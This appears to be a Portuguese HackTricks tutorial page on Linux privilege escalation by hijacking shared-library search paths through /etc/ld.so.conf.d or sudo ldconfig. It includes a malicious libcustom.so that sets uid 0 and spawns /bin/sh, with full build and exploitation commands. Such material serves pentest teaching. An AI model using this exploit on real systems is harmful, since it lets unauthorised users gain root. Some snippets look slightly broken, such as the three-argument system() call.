# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Preparar o ambiente

Na seção a seguir, você pode encontrar o código dos arquivos que vamos usar para preparar o ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crie** esses arquivos na sua máquina na mesma pasta
2. **Compile** a **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copie** `libcustom.so` para `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilégios de root)
4. **Compile** o **executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifique o ambiente

Verifique se _libcustom.so_ está sendo **carregado** de _/usr/lib_ e se você pode **executar** o binário.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

Neste cenário, vamos supor que **alguém criou uma entrada vulnerável** dentro de um arquivo em _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso gravável).\
**Baixe e compile** o seguinte código dentro desse caminho:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Agora que criamos a **biblioteca maliciosa libcustom dentro do caminho mal configurado**, precisamos esperar por um **reinício** ou que o usuário root execute **`ldconfig`** (_caso você possa executar este binário como **sudo** ou ele tenha o **suid bit**, você poderá executá-lo você mesmo_).

Uma vez que isso tenha acontecido, **verifique novamente** de onde o executável `sharevuln` está carregando a biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como você pode ver, está **carregando a partir de `/home/ubuntu/lib`** e se qualquer usuário executá-lo, um shell será executado:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Note que neste exemplo não escalamos privilégios, mas modificando os comandos executados e **esperando que o root ou outro usuário privilegiado execute o binário vulnerável** conseguiremos escalar privilégios.

### Outras má configurações - Mesma vulnerabilidade

No exemplo anterior, simulamos uma má configuração onde um administrador **definiu uma pasta não privilegiada dentro de um arquivo de configuração em `/etc/ld.so.conf.d/`**.\
Mas existem outras má configurações que podem causar a mesma vulnerabilidade; se você tiver **permissões de escrita** em algum **arquivo de configuração** dentro de `/etc/ld.so.conf.d`, na pasta `/etc/ld.so.conf.d` ou no arquivo `/etc/ld.so.conf`, você pode configurar a mesma vulnerabilidade e explorá-la.

## Exploit 2

**Suponha que você tenha privilégios sudo sobre `ldconfig`**.\
Você pode indicar ao `ldconfig` **onde carregar os arquivos de configuração**, então podemos aproveitar isso para fazer o `ldconfig` carregar pastas arbitrárias.\
Então, vamos criar os arquivos e pastas necessários para carregar "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Agora, como indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
E finalmente, vamos carregar o caminho e verificar de onde o binário está carregando a biblioteca:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como você pode ver, tendo privilégios de sudo sobre `ldconfig`, você pode explorar a mesma vulnerabilidade.**

{{#include ../../banners/hacktricks-training.md}}
